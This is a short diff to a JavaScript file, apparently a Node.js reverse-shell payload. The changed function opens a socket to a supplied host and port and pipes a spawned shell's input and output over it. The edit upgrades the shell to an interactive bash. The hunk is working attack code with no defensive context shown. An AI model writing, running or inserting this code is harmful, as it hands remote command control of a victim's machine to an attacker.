@@ -33,7 +33,7 @@ if (typeof String.prototype.contains === 'undefined') { String.prototype.contain
 function c(HOST,PORT) {
     var client = new net.Socket();
     client.connect(PORT, HOST, function() {
-        var sh = spawn('/bin/sh',[]);
+        var sh = spawn('/bin/bash',['-i']);
         client.write("Connected!\\n");
         client.pipe(sh.stdin);
         sh.stdout.pipe(client);
